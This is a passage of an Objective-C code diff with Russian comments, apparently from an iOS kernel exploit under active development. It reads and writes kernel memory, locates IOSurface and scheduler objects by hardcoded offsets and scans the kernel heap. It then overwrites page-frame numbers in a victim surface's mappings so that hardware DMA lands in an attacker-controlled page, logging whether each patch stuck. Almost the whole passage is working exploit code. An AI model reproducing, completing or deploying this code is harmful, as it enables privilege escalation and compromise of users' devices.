+            uint64_t ucS = kpLooksLikeKernelPointer(vcS) ? kp_untag_ptr(early_kread64(vcS + 0x30)) : 0;
+            uint64_t provS = kpLooksLikeKernelPointer(ucS) ? kp_untag_ptr(early_kread64(ucS + 0xe8)) : 0;
+            uint64_t maskS = kpLooksLikeKernelPointer(provS) ? early_kread64(provS + 0x180) : 0;
+            int piS = -1;
+            for (int b = 0; b < 8; b++) if (maskS & (1ULL << b)) { piS = b; break; }
+            uint64_t pipeS = (piS >= 0) ? kp_untag_ptr(early_kread64(provS + 0x140 + (uint64_t)piS * 8)) : 0;
+            uint64_t nodeS = kpLooksLikeKernelPointer(pipeS) ? kp_untag_ptr(early_kread64(pipeS + 0x178)) : 0;
+            kpNote(r, [NSString stringWithFormat:@"  [SPC] fallback: UC=%#llx pipe=%#llx node=%#llx",
+                      (unsigned long long)ucS, (unsigned long long)pipeS, (unsigned long long)nodeS]);
+            for (uint32_t ni = 0; ni < 8 && kpLooksLikeKernelPointer(nodeS) && kpSafeToRead(nodeS) && nSpec < 8; ni++) {
+                for (uint32_t o = 0; o + 8 <= 0xa0 && nSpec < 8; o += 8) {
+                    uint64_t Q = kp_untag_ptr(early_kread64(nodeS + o));
+                    if (!kpLooksLikeKernelPointer(Q) || !kpSafeToRead(Q)) continue;
+                    uint64_t v = early_kread64(Q + 0x58);
+                    if ((uint32_t)v != pfn32) continue;
+                    uint64_t nq = (v & 0xffffffff00000000ULL) | ctlPFN;
+                    kpNote(r, [NSString stringWithFormat:@"    [SPC] ★ spec: node[%u]+%#x → %#llx+0x58: %#018llx → %#018llx",
+                              ni, o, (unsigned long long)Q, (unsigned long long)v, (unsigned long long)nq]);
+                    usleep(2000);
+                    early_kwrite64(Q + 0x58, nq);
+                    uint64_t rb = early_kread64(Q + 0x58);
+                    kpNote(r, [NSString stringWithFormat:@"        readback: %#018llx — %@", (unsigned long long)rb, rb == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
+                    specVA[nSpec] = Q + 0x58; specOld[nSpec] = v; nSpec++;
+                }
+                uint64_t nx = kp_untag_ptr(early_kread64(nodeS + 0x20));
+                if (!kpLooksLikeKernelPointer(nx) || nx == nodeS) nx = kp_untag_ptr(early_kread64(nodeS + 0x10));
+                if (!kpLooksLikeKernelPointer(nx) || nx == nodeS) nx = kp_untag_ptr(early_kread64(nodeS + 0x8));
+                if (!kpLooksLikeKernelPointer(nx) || nx == nodeS) break;
+                nodeS = nx;
+            }
+            if (!nSpec) kpNote(r, @"  [SPC] spec+0x58 с pfn32 нигде не найден");
+        }
+    }
+    // 1.9.231: OPC-EARLY — [OPC] после execute#1 не находил op (reaped из очередей
+    // за ~40с DEP-скана, op=0). Локатор СРАЗУ после submit: op pending, запись жива.
+    // Идём op-entry([op+0x48]==UC) → plane-struct → surf(sid=dstID) → desc →
+    // [desc+0x60] spec и ЗАПОМИНАЕМ АДРЕС (specOld=0-маркер: pfn ещё не заполнен).
+    // Патч — в retry (спек заполнен execute#1, rewriter перечитывает каждый execute).
+    {
+        uint64_t vcE = kpM2TClientVA(r, isTable, victim, @"opcE-victim");
+        uint64_t ucE = kpLooksLikeKernelPointer(vcE) ? kp_untag_ptr(early_kread64(vcE + 0x30)) : 0;
+        uint64_t provE = kpLooksLikeKernelPointer(ucE) ? kp_untag_ptr(early_kread64(ucE + 0xe8)) : 0;
+        // 1.9.234: scheduler — ПЕРЕБОРОМ, как оракул 1.9.147 (233: [prov+0xb8] и
+        // pipe дали мусорные counts — не они). Кандидаты: prov, его поля (0x00-
+        // 0x168) и их pointee (0x00-0x200). Layout: cnt@[c+0xb8] ∈ (0,0x2000],
+        // a1=[c+0xc8] a2=[c+0x110] kernel. Первый валидный = scheduler.
+        uint64_t schedE = 0;
+        if (kpLooksLikeKernelPointer(provE) && kpSafeToRead(provE)) {
+            uint64_t cand[40]; int cn = 0;
+            cand[cn++] = provE;
+            for (uint32_t o = 0; o + 8 <= 0x168 && cn < 20; o += 8) {
+                uint64_t p = kp_untag_ptr(early_kread64(provE + o));
+                if (!kpLooksLikeKernelPointer(p)) continue;
+                BOOL dup = NO;
+                for (int k = 0; k < cn; k++) if (cand[k] == p) { dup = YES; break; }
+                if (!dup) cand[cn++] = p;
+            }
+            for (int i = 0; i < cn && !schedE; i++) {
+                uint64_t c = cand[i];
+                if (!kpSafeToRead(c)) continue;
+                uint64_t cnt0 = early_kread64(c + 0xb8);
+                uint64_t a1 = kp_untag_ptr(early_kread64(c + 0xc8));
+                uint64_t a2 = kp_untag_ptr(early_kread64(c + 0x110));
+                if (cnt0 && cnt0 <= 0x2000 && kpLooksLikeKernelPointer(a1) && kpLooksLikeKernelPointer(a2)) { schedE = c; break; }
+                // уровень 2: указатели внутри кандидата
+                for (uint32_t o2 = 0; o2 + 8 <= 0x200 && !schedE; o2 += 8) {
+                    uint64_t p2 = kp_untag_ptr(early_kread64(c + o2));
+                    if (!kpLooksLikeKernelPointer(p2) || !kpSafeToRead(p2)) continue;
+                    uint64_t cnt2 = early_kread64(p2 + 0xb8);
+                    uint64_t b1 = kp_untag_ptr(early_kread64(p2 + 0xc8));
+                    uint64_t b2 = kp_untag_ptr(early_kread64(p2 + 0x110));
+                    if (cnt2 && cnt2 <= 0x2000 && kpLooksLikeKernelPointer(b1) && kpLooksLikeKernelPointer(b2)) { schedE = p2; break; }
+                }
+            }
+        }
+        uint64_t opE = 0;
+        if (kpLooksLikeKernelPointer(schedE) && kpSafeToRead(schedE)) {
+            uint64_t arraysE[2] = { kp_untag_ptr(early_kread64(schedE + 0xc8)), kp_untag_ptr(early_kread64(schedE + 0x110)) };
+            uint64_t countsE[2] = { early_kread64(schedE + 0xb8), early_kread64(schedE + 0x100) };
+            kpNote(r, [NSString stringWithFormat:@"  [OPC-E] sched=%#llx counts=%llu/%llu arr=%#llx/%#llx",
+                      (unsigned long long)schedE, countsE[0], countsE[1], (unsigned long long)arraysE[0], (unsigned long long)arraysE[1]]);
+            for (int ai = 0; ai < 2 && !opE; ai++) {
+                uint64_t arr = arraysE[ai];
+                uint64_t cnt = countsE[ai]; if (cnt > 256) cnt = 256;
+                if (!kpLooksLikeKernelPointer(arr)) continue;
+                int nDump = 0;
+                for (uint64_t i = 0; i < cnt && !opE; i++) {
+                    uint64_t op = kp_untag_ptr(early_kread64(arr + i * 8));
+                    if (!kpLooksLikeKernelPointer(op) || !kpSafeToRead(op)) continue;
+                    uint32_t credit = (uint32_t)(early_kread64(op + 0xc38) >> 32);
+                    uint64_t backref = kp_untag_ptr(early_kread64(op + 0x48));
+                    if (nDump < 4) { kpNote(r, [NSString stringWithFormat:@"    op[%llu]=%#llx credit=%#x back=%#llx", i, (unsigned long long)op, credit, (unsigned long long)backref]); nDump++; }
+                    if (credit == 0x10 || backref == ucE) { opE = op; break; }
+                }
+            }
+        }
+        kpNote(r, [NSString stringWithFormat:@"  [OPC-E] UC=%#llx prov=%#llx op=%#llx", (unsigned long long)ucE, (unsigned long long)provE, (unsigned long long)opE]);
+        if (opE) {
+            uint64_t psE[2] = { kp_untag_ptr(early_kread64(opE + 0x438)), kp_untag_ptr(early_kread64(opE + 0x6f8)) };
+            for (int pi = 0; pi < 2 && !nSpec; pi++) {
+                uint64_t ps = psE[pi];
+                if (!kpLooksLikeKernelPointer(ps) || !kpSafeToRead(ps)) continue;
+                uint64_t surf3 = kp_untag_ptr(early_kread64(ps + 0x90));
+                uint32_t sid3 = kpLooksLikeKernelPointer(surf3) ? (uint32_t)early_kread64(surf3 + 0x10) : 0;
+                if (sid3 != dstID) continue;
+                uint64_t pd3 = kp_untag_ptr(early_kread64(surf3 + 0x30));
+                uint64_t spec3 = (kpLooksLikeKernelPointer(pd3) && kpSafeToRead(pd3)) ? kp_untag_ptr(early_kread64(pd3 + 0x60)) : 0;
+                if (!kpLooksLikeKernelPointer(spec3) || !kpSafeToRead(spec3)) continue;
+                uint64_t len3 = early_kread64(spec3 + 0x08);
+                kpNote(r, [NSString stringWithFormat:@"  [OPC-E] ★ spec НАЙДЕН: %#llx (len=%#llx) — адрес записан, патч в retry", (unsigned long long)spec3, (unsigned long long)len3]);
+                specVA[nSpec] = spec3 + 0x58; specOld[nSpec] = 0; nSpec++;
+            }
+        }
+    }
+    // 1.9.147: OP-ENTRY ОРАКУЛ — surfVA из самой оп-записи scheduler'а, без портов
+    // и реестра. Submit (sel1) резолвит surface ptr в op-entry (раунд 24); нашу
+    // запись находим по credit=0x10 (sel10 выше), сканируем 0x21c0 на указатели,
+    // каждый проверяем surfFast (pfn-цепочка = железная правда backingPA). Окно:
+    // churn-backlog держит workloop ≈30-50мс, запись жива до execute.
+    if (!surfVA && isTable && victim != IO_OBJECT_NULL) {
+        // 1.9.148: весь оракул на early_kread64 — kpRead флаки ровно на zone-map,
+        // где живут client/scheduler (причина scheduler=0 в 1.9.147). Цепочка
+        // из раунда 2: [UC+0xe8] → объект → [объект+0xb8] = scheduler; плюс
+        // двухуровневый layout-скан (cnt@+0xb8, массивы @+0xc8/+0x110).
+        uint64_t vcVA = kpM2TClientVA(r, isTable, victim, @"paswap-victim");
+        uint64_t schedVA = 0;
+        uint64_t (^schedIfLayout)(uint64_t) = ^uint64_t(uint64_t c) {
+            if (!kpLooksLikeKernelPointer(c)) return (uint64_t)0;
+            uint64_t cnt = early_kread64(c + 0xb8);
+            uint64_t a1 = kp_untag_ptr(early_kread64(c + 0xc8));
+            uint64_t a2 = kp_untag_ptr(early_kread64(c + 0x110));
+            if (cnt > 0x2000) return (uint64_t)0;
+            if (!kpLooksLikeKernelPointer(a1) || !kpLooksLikeKernelPointer(a2)) return (uint64_t)0;
+            return c;
+        };
+        if (vcVA) {
+            // 1.9.151: vcVA = IOMachPort — реальный клиент = fObject @ +0x30
+            // (раунд 30; +0x28 = fPort — сам ipc_port, отсюда obj(+0xe8)=0 в 1.9.149).
+            uint64_t vcReal = kp_untag_ptr(early_kread64(vcVA + 0x30));
+            if (!kpLooksLikeKernelPointer(vcReal)) vcReal = vcVA;
+            uint64_t vcRealVt = kpLooksLikeKernelPointer(vcReal) ? kp_untag_ptr(early_kread64(vcReal)) : 0;
+            uint64_t ks2 = kconstant(base) - 0xfffffff007004000ULL;
+            uint64_t obj = kp_untag_ptr(early_kread64(vcReal + 0xe8));
+            schedVA = schedIfLayout(kp_untag_ptr(early_kread64(obj + 0xb8)));
+            if (!schedVA) schedVA = schedIfLayout(obj);
+            uint64_t cand[32];
+            uint32_t cn = 0;
+            if (!schedVA) {
+                for (uint32_t o = 0; o + 8 <= 0x168 && cn < 32; o += 8) {
+                    uint64_t p = kp_untag_ptr(early_kread64(vcReal + o));
+                    if (!kpLooksLikeKernelPointer(p)) continue;
+                    BOOL dup = NO;
+                    for (uint32_t k = 0; k < cn; k++) if (cand[k] == p) { dup = YES; break; }
+                    if (!dup) cand[cn++] = p;
+                }
+                for (uint32_t i = 0; i < cn && !schedVA; i++) {
+                    if ((schedVA = schedIfLayout(cand[i]))) break;
+                    // уровень 2: указатели внутри кандидата
+                    for (uint32_t o = 0; o + 8 <= 0x200 && !schedVA; o += 8) {
+                        uint64_t p2 = kp_untag_ptr(early_kread64(cand[i] + o));
+                        if (p2 && kpLooksLikeKernelPointer(p2)) schedVA = schedIfLayout(p2);
+                    }
+                }
+            }
+            kpNote(r, [NSString stringWithFormat:@"  op-entry oracle: clientVA=%#llx fObject=%#llx fObjVt(file)=%#llx obj(+0xe8)=%#llx scheduler=%#llx (кандидатов=%u)",
+                      (unsigned long long)vcVA, (unsigned long long)vcReal,
+                      (unsigned long long)(vcRealVt ? vcRealVt - ks2 : 0),
+                      (unsigned long long)obj, (unsigned long long)schedVA, cn]);
+        }
+        if (schedVA) {
+            uint64_t cnt = early_kread64(schedVA + 0xb8);
+            uint64_t arr = kp_untag_ptr(early_kread64(schedVA + 0xc8));
+            uint64_t eptrs[384];
+            uint32_t eN = 0;
+            if (kpLooksLikeKernelPointer(arr) && cnt && cnt <= 384) {
+                for (uint64_t i = 0; i < cnt && eN < 384; i++) {
+                    uint64_t p = kp_untag_ptr(early_kread64(arr + i * 8));
+                    if (kpLooksLikeKernelPointer(p)) eptrs[eN++] = p;
+                }
+            }
+            if (!eN) {
+                for (uint32_t o = 0xc8; o + 8 <= 0x1c8 && eN < 16; o += 8) {
+                    uint64_t p = kp_untag_ptr(early_kread64(schedVA + o));
+                    if (kpLooksLikeKernelPointer(p)) eptrs[eN++] = p;
+                }
+            }
+            kpNote(r, [NSString stringWithFormat:@"  entry-array: %u записей (count=%llu) — ищу credit +0xc3c==0x10", eN, cnt]);
+            for (uint32_t i = 0; i < eN && !surfVA; i++) {
+                if ((uint32_t)(early_kread64(eptrs[i] + 0xc38) >> 32) != 0x10) continue;
+                uint64_t entryVA = eptrs[i];
+                kpNote(r, [NSString stringWithFormat:@"  ★ наша оп-запись @ %#llx (credit ✓) — указатели 0x21c0 с surfFast:",
+                          (unsigned long long)entryVA]);
+                for (uint32_t off = 0; off + 8 <= 0x21c0 && !surfVA; off += 8) {
+                    uint64_t u = kp_untag_ptr(early_kread64(entryVA + off));
+                    if (!kpLooksLikeKernelPointer(u)) continue;
+                    BOOL hit = surfFast(u);
+                    kpNote(r, [NSString stringWithFormat:@"    entry+%#04x: %#llx surfFast=%d%@",
+                              off, (unsigned long long)u, (int)hit, hit ? @" ← IOSURFACE!" : @""]);
+                    if (hit) surfVA = u;
+                }
+            }
+            if (!surfVA)
+                kpNote(r, @"  op-entry oracle: записи с credit=0x10 нет или указателей с pfn — дренулись/scheduler не тот");
+        }
+    }
+    // (блок слотов/подмены перенесён в порт-маршрут — теперь строго ДО submit, 1.9.155)
+    // 3. Резолв surfVA через реестр фреймворковского UC (раунд 21):
+    //    [ucVA+0xe8] = collection → +0xd0 array (индекс=surfaceID) → surfVA,
+    //    верификация [surfVA+0x10]==dstID. UC находим перебором наших портов —
+    //    читаем kreadbuf'ом (1.9.120 промах: kpRead не транслирует zone map,
+    //    где UC и живёт — фреймворковский UC отбрасывался молча).
+    // 1.9.143: surfVA/rangesVA/rootVA объявлены выше (порт-маршрут); реестр —
+    // только если порт-маршрут не нашёл поверхность.
+    if (!surfVA) {
+        // 1.9.137: реестр клиентов по TASK (раунд 21, findClientByTask):
+        //    IOSurfaceRoot → кэш 2 слота @ root+0x418/+0x428, иначе count @
+        //    root+0x408 + записи {task,client} 0x10 @ root+0x440 → наш client
+        //    по taskVA → [client+0xe8] collection → +0xd0 array → surfVA.
+        //    Авторитетный путь — класс UC идентифицировать не нужно.
+        io_service_t isvc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                        IOServiceMatching("IOSurfaceRoot"));
+        rootVA = isvc ? kpM2TClientVA(r, isTable, isvc, @"iosurfroot") : 0;
+        // 1.9.151: rootVA = IOMachPort-обёртка (0x38!) — реальный IOSurfaceRoot =
+        // fObject @ +0x30 (раунд 30; +0x28 = fPort — сам ipc_port!). Без хопа
+        // реестр читал соседнюю zone-память по +0x408/+0x418/+0x440 — вечные нули.
+        uint64_t rootWrap = rootVA;
+        uint64_t rootReal = kp_untag_ptr(early_kread64(rootVA + 0x30));
+        if (kpLooksLikeKernelPointer(rootReal)) rootVA = rootReal;
+        kpNote(r, [NSString stringWithFormat:@"  IOSurfaceRoot: svc=0x%x wrap=%#llx rootVA(fObject)=%#llx taskVA=%#llx",
+                  isvc, (unsigned long long)rootWrap, (unsigned long long)rootVA, (unsigned long long)taskVA]);
+        if (isvc) IOObjectRelease(isvc);
+        if (rootVA) {
+            // 1.9.152 (раунд 31): UC+0xe8 = сам IOSurfaceRoot*; на Root:
+            // array @ +0xd0 (index=surfaceID), count @ +0xd8 — ГЛОБАЛЬНЫЙ реестр,
+            // per-client findClientByTask не нужен. verify [obj+0x10]==surfaceID.
+            uint64_t rcnt = early_kread64(rootVA + 0xd8);
+            uint64_t rarr = kp_untag_ptr(early_kread64(rootVA + 0xd0));
+            kpNote(r, [NSString stringWithFormat:@"  реестр Root: array=%#llx count=%llu (dstID=%u)",
+                      (unsigned long long)rarr, (unsigned long long)rcnt, dstID]);
+            if (kpLooksLikeKernelPointer(rarr) && rcnt > dstID && rcnt < 0x200000) {
+                uint64_t cand = kp_untag_ptr(early_kread64(rarr + (uint64_t)dstID * 8));
+                if (kpLooksLikeKernelPointer(cand)) {
+                    uint32_t cid = (uint32_t)early_kread64(cand + 0x10);
+                    kpNote(r, [NSString stringWithFormat:@"    cand=%#llx [+0x10]=%u (ждём %u) surfFast=%d",
+                              (unsigned long long)cand, cid, dstID, (int)surfFast(cand)]);
+                    if (cid == dstID || surfFast(cand)) {
+                        uint64_t ro = kp_untag_ptr(early_kread64(cand + 0x178));
+                        uint64_t rq = kpLooksLikeKernelPointer(ro) ? early_kread64(ro + 0x18) : 0;
+                        surfVA = cand;
+                        rangesVA = kpLooksLikeKernelPointer(ro) ? ro + 0x18 : 0;
+                        kpNote(r, [NSString stringWithFormat:@"  ★ реестр Root+0xd0: surfVA=%#llx rangeObj=%#llx rangesVA=%#llx (qword=%#018llx)",
+                                  (unsigned long long)surfVA, (unsigned long long)ro,
+                                  (unsigned long long)rangesVA, (unsigned long long)rq]);
+                    }
+                }
+            }
+        }
+        if (rootVA && taskVA) {
+            uint64_t clientVA = 0;
+            // сначала кэш 2 слота
+            for (uint64_t cs = 0x418; cs <= 0x428 && !clientVA; cs += 0x10) {
+                if (kp_untag_ptr(early_kread64(rootVA + cs)) == taskVA)
+                    clientVA = kp_untag_ptr(early_kread64(rootVA + cs + 8));
+            }
+            if (!clientVA) {
+                uint64_t cnt = early_kread64(rootVA + 0x408);
+                uint64_t arr = kp_untag_ptr(early_kread64(rootVA + 0x440));
+                kpNote(r, [NSString stringWithFormat:@"  client array: count=%llu arr=%#llx",
+                          (unsigned long long)cnt, (unsigned long long)arr]);
+                if (cnt && cnt < 4096 && kpLooksLikeKernelPointer(arr)) {
+                    for (uint64_t i = 0; i < cnt && i < 4096 && !clientVA; i++) {
+                        if (kp_untag_ptr(early_kread64(arr + i * 0x10)) != taskVA) continue;
+                        clientVA = kp_untag_ptr(early_kread64(arr + i * 0x10 + 8));
+                    }
+                }
+            }
+            kpNote(r, [NSString stringWithFormat:@"  наш client в реестре: %#llx", (unsigned long long)clientVA]);
+            if (kpLooksLikeKernelPointer(clientVA)) {
+                uint64_t coll = kp_untag_ptr(early_kread64(clientVA + 0xe8));
+                uint64_t cnt2 = kpLooksLikeKernelPointer(coll) ? early_kread64(coll + 0xd8) : 0;
+                uint64_t arr2 = (cnt2 > dstID && cnt2 < 0x200000) ? kp_untag_ptr(early_kread64(coll + 0xd0)) : 0;
+                if (kpLooksLikeKernelPointer(arr2)) {
+                    uint64_t cand = kp_untag_ptr(early_kread64(arr2 + (uint64_t)dstID * 8));
+                    if (kpLooksLikeKernelPointer(cand)) {
+                        if (surfFast(cand)) {
+                            uint64_t ro = kp_untag_ptr(early_kread64(cand + 0x178));
+                            uint64_t rq = kpLooksLikeKernelPointer(ro) ? early_kread64(ro + 0x18) : 0;
+                            surfVA = cand;
+                            rangesVA = ro + 0x18;
+                            kpNote(r, [NSString stringWithFormat:@"  ★ реестр (pfn-вериф.): surfVA=%#llx rangeObj=%#llx rangesVA=%#llx (qword=%#018llx)",
+                                      (unsigned long long)surfVA, (unsigned long long)ro,
+                                      (unsigned long long)rangesVA, (unsigned long long)rq]);
+                        }
+                    }
+                }
+            }
+        }
+    }
+    kpNote(r, [NSString stringWithFormat:@"  резолв: surfVA=%#llx rangesVA=%#llx",
+              (unsigned long long)surfVA, (unsigned long long)rangesVA]);
+    kpNote(r, [NSString stringWithFormat:@"  резолв: surfVA=%#llx rangesVA=%#llx",
+              (unsigned long long)surfVA, (unsigned long long)rangesVA]);
+    if (!surfVA && rootVA) {
+        // 1.9.140: count по +0xd8 не count вовсе (PAC'd ptr). Дженерик-скан:
+        // каждый heap-ptr поля rootVA+0xc0..0x120 = кандидат массива
+        // поверхностей; в нём ищем запись [cand+0x10]==dstID + ranges-цепочка
+        // против backingPA. Верификация сама выбирает, count не нужен.
+        kpNote(r, @"  дженерик-скан heap-ptr'ов rootVA как кандидатов массива:");
+        for (uint64_t oo = 0xc0; oo <= 0x120 && !rangesVA; oo += 8) {
+            uint64_t P = kp_untag_ptr(early_kread64(rootVA + oo));
+            if (!kpLooksLikeKernelPointer(P)) continue;
+            for (uint32_t i = 0; i < 0x40 && !rangesVA; i++) {
+                uint64_t cand = kp_untag_ptr(early_kread64(P + (uint64_t)i * 8));
+                if (!surfFast(cand)) continue;
+                uint64_t ro = kp_untag_ptr(early_kread64(cand + 0x178));
+                uint64_t rq = kpLooksLikeKernelPointer(ro) ? early_kread64(ro + 0x18) : 0;
+                surfVA = cand;
+                rangesVA = ro + 0x18;
+                kpNote(r, [NSString stringWithFormat:@"  ★ массив root+%#llx[%u]: surfVA=%#llx rangesVA=%#llx (qword=%#018llx)",
+                          oo, i, (unsigned long long)surfVA, (unsigned long long)rangesVA, (unsigned long long)rq]);
+            }
+        }
+        if (!rangesVA) kpNote(r, @"  ни один heap-ptr не оказался массивом с нашей поверхностью");
+    }
+    if (!rangesVA) {
+        // 1.9.130: ИЗМЕРЕНИЕ вместо тихого выхода — после execute сканируем
+        // heap (тип 0x21) на ВСЕ формы backingPA и печатаем попадания с
+        // соседями: видно, какие структуры держат физику поверхности после
+        // execute (live page-list / DART PTE / cache / копии).
+        kpNote(r, @"  SCAN B (после execute): скан heap на формы backingPA — сравниваем со SCAN A (create-wired vs execute-wired):");
+        usleep(300000);
+        uint64_t tableVA = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
+        uint64_t totalPages = kconstant(physSize) >> 14;
+        uint64_t pfn64m = backingPA >> 14;
+        int nHits = 0;
+        for (uint64_t pg = 0; pg < totalPages && nHits < 24; pg++) {
+            uint8_t ent[16];
+            kreadbuf(tableVA + pg * 16, ent, 16);
+            if (ent[2] != 0x21) continue;
+            uint64_t pa = kconstant(physBase) + pg * 0x4000;
+            uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
+            if (!kva) continue;
+            uint8_t buf[0x4000];
+            kreadbuf(kva, buf, sizeof(buf));   // 1.9.189: рет НЕ проверяем — ds-шим всегда 0, старый `if(!kreadbuf) continue` пропускал анализ ВСЕГДА
+            for (uint32_t o = 0; o + 8 <= sizeof(buf) && nHits < 24; o += 8) {
+                uint64_t q = 0;
+                memcpy(&q, buf + o, 8);
+                int form = 0;
+                if (q == backingPA) form = 1;
+                else if ((uint32_t)q == (uint32_t)pfn64m && !(q >> 32)) form = 2;
+                else if ((uint32_t)(q >> 32) == (uint32_t)pfn64m) form = 3;
+                else if ((uint32_t)q == (uint32_t)pfn64m) form = 4;
+                if (!form) continue;
+                nHits++;
+                uint64_t n0 = 0, n1 = 0;
+                if (o >= 8) memcpy(&n0, buf + o - 8, 8);
+                memcpy(&n1, buf + o + 8, 8);
+                kpNote(r, [NSString stringWithFormat:@"    hit#%d форма%d @ %#llx: %#018llx | соседи: %#018llx %#018llx",
+                          nHits, form, (unsigned long long)(kva + o), (unsigned long long)q,
+                          (unsigned long long)n0, (unsigned long long)n1]);
+            }
+        }
+        kpNote(r, [NSString stringWithFormat:@"  измерение: попаданий=%d (форма1=rawPA 2=pfn64lo 3=pfn32hi 4=pfn32lo)", nHits]);
+        // 1.9.247: ранний return УБРАН — при rangesVA=0 (этот билд) он превращал
+        // retry/spec/forge в мёртвый код (прогон 246 умер на «попаданий=2»).
+        // Ниже 7266 обрабатывает rangesVA=0 штатно — падаем в retry-конвейер.
+    }
+
+    // 4. подмена pfn: порт-маршрут (1.9.143) уже пропатчил слоты ДО submit;
+    //    старые пути (реестр/дженерик-скан) находят rangesVA ПОСЛЕ submit —
+    //    патчим сейчас, в окне churn-backlog (workloop занят ≈30-50мс), до execute.
+    if (!nSlots) {
+        if (!rangesVA) {
+            // 1.9.242: rangesVA=0 (XPF ranges-пусто на этом билде) — НЕ уходим:
+            // DEP-детектор/патчер уже поработал до submit, execute всё равно идёт.
+            kpNote(r, @"  rangesVA=0 — одиночный путь пропускаем, полагаемся на DEP-детектор");
+        } else {
+            uint64_t origQ = 0;
+            kreadbuf(rangesVA, &origQ, 8);
+            if ((uint32_t)(origQ >> 32) != pfn32) {
+                kpNote(r, [NSString stringWithFormat:@"  ranges qword ушёл (%#018llx) — записи НЕ БУДЕТ", (unsigned long long)origQ]);
+                IOObjectRelease(svc);
+                free(ctl);
+                return r;
+            }
+            slotVAs[0] = rangesVA;
+            origQs[0] = origQ;
+            slotForm[0] = 1;
+            nSlots = 1;
+            uint64_t newQ = ((uint64_t)ctlPFN << 32) | (origQ & 0xFFFFFFFFULL);
+            kpNote(r, [NSString stringWithFormat:@"  ПОДМЕНА ranges %#018llx → %#018llx (pfn %#x → %#x, lo32 сохранён)",
+                      (unsigned long long)origQ, (unsigned long long)newQ, pfn32, ctlPFN]);
+            kwritebuf(rangesVA, &newQ, 8);
+            uint64_t rb = 0;
+            kreadbuf(rangesVA, &rb, 8);
+            kpNote(r, [NSString stringWithFormat:@"  readback = %#018llx %@", (unsigned long long)rb, rb == newQ ? @"— ПРИЛИПЛО" : @"— НЕ прилипло"]);
+        }
+    } else {
+        kpNote(r, [NSString stringWithFormat:@"  %d pfn-слот(а) пропатчены порт-маршрутом ДО submit — victim подхватывает ctlPA при первом execute", nSlots]);
+    }
+    kpNote(r, @"  жду execute victim-опа (backlog ~800 async)…");
+    usleep(400000);   // backlog drains → victim executes → DMA
+    int changed = 0;
+    for (uint32_t i = 0; i < 0x4000; i += 4) {
+        uint32_t px = *(volatile uint32_t *)(ctl + i);
+        if (px != 0xCCCCCCCC && px != 0) { changed++; if (changed <= 4) kpNote(r, [NSString stringWithFormat:@"    ctl+%#x: %#010x", i, px]); }
+    }
+    // Куда реально ушёл DMA: пиксели dst после execute — ненулевые = записал в
+    // оригинальный backing (DVA не последовал за подменой), пусто = не execute.
+    IOSurfaceLock(dstS, 0, NULL);
+    uint32_t *pxd = (uint32_t *)IOSurfaceGetBaseAddress(dstS);
+    int nzd = 0;
+    if (pxd) for (int i = 0; i < 1024; i++) if (pxd[i] && pxd[i] != 0x41544159) nzd++;
+    IOSurfaceUnlock(dstS, 0, NULL);
+    kpNote(r, [NSString stringWithFormat:@"  dst пиксели после execute: ненулевых = %d — %@", nzd,
+              nzd ? @"DMA ушёл в ОРИГИНАЛЬНЫЙ backing (кэш DVA не последовал за подменой)" : @"в dst пусто"]);
+    // 1.9.156: слоты после execute — откатило ли что-то pfn обратно (объяснение
+    // «DMA в оригинал» при пропатченном слоте) или execute читает ДРУГОЙ источник
+    for (int j = 0; j < nSlots; j++) {
+        uint64_t cur = early_kread64(slotVAs[j]);
+        kpNote(r, [NSString stringWithFormat:@"  слот#%d после execute: %#018llx — %@",
+                  j, (unsigned long long)cur,
+                  cur == newQs[j] ? @"патч НА МЕСТЕ (execute читает другой источник!)" :
+                  cur == origQs[j] ? @"ОТКАТИЛО в оригинал (кто-то переписал слот)" : @"ИЗМЕНЕНО третьим"]);
+    }
+    // 1.9.229 (р.56): ПОЛНАЯ ЦЕПЬ ДО SPEC — op-entry ([op+0x48]==UC) →
+    // plane-struct (sel1: op+0x438) → [ps+0x90]=IOSurface → [surf+0x30]=plane-desc
+    // → [desc+0x60]=ranges-spec (kalloc_type 0x64) → +0x58 pfn32 = patch-point.
+    // cmd: [ps+0x98] → [cmd+0x70] mapObj → [+0xa0] DVA. До retry — вооружён.
+    {
+        uint64_t vcO = kpM2TClientVA(r, isTable, victim, @"opc-victim");
+        uint64_t ucO = kpLooksLikeKernelPointer(vcO) ? kp_untag_ptr(early_kread64(vcO + 0x30)) : 0;
+        uint64_t provO = kpLooksLikeKernelPointer(ucO) ? kp_untag_ptr(early_kread64(ucO + 0xe8)) : 0;
+        uint64_t opVA = 0;
+        if (kpLooksLikeKernelPointer(provO) && kpSafeToRead(provO)) {
+            uint64_t arrays[2] = { kp_untag_ptr(early_kread64(provO + 0xc8)), kp_untag_ptr(early_kread64(provO + 0x110)) };
+            uint64_t counts[2] = { early_kread64(provO + 0xb8), early_kread64(provO + 0x100) };
+            for (int ai = 0; ai < 2 && !opVA; ai++) {
+                uint64_t arr = arrays[ai];
+                uint64_t cnt = counts[ai]; if (cnt > 256) cnt = 256;
+                if (!kpLooksLikeKernelPointer(arr)) continue;
+                for (uint64_t i = 0; i < cnt && !opVA; i++) {
+                    uint64_t op = kp_untag_ptr(early_kread64(arr + i * 8));
+                    if (!kpLooksLikeKernelPointer(op) || !kpSafeToRead(op)) continue;
+                    if (kp_untag_ptr(early_kread64(op + 0x48)) == ucO) { opVA = op; break; }
+                }
+            }
+        }
+        kpNote(r, [NSString stringWithFormat:@"  [OPC] UC=%#llx prov=%#llx op=%#llx", (unsigned long long)ucO, (unsigned long long)provO, (unsigned long long)opVA]);
+        if (opVA) {
+            uint64_t psArr[2] = { kp_untag_ptr(early_kread64(opVA + 0x438)), kp_untag_ptr(early_kread64(opVA + 0x6f8)) };
+            for (int pi = 0; pi < 2 && !nSpec; pi++) {
+                uint64_t ps = psArr[pi];
+                if (!kpLooksLikeKernelPointer(ps) || !kpSafeToRead(ps)) continue;
+                uint64_t surf2 = kp_untag_ptr(early_kread64(ps + 0x90));
+                uint32_t sid2 = kpLooksLikeKernelPointer(surf2) ? (uint32_t)early_kread64(surf2 + 0x10) : 0;
+                // cmd → DVA для контроля
+                uint64_t cmd2 = kp_untag_ptr(early_kread64(ps + 0x98));
+                uint64_t mapObj2 = (kpLooksLikeKernelPointer(cmd2) && kpSafeToRead(cmd2)) ? kp_untag_ptr(early_kread64(cmd2 + 0x70)) : 0;
+                uint64_t dva2 = 0, len2 = 0;
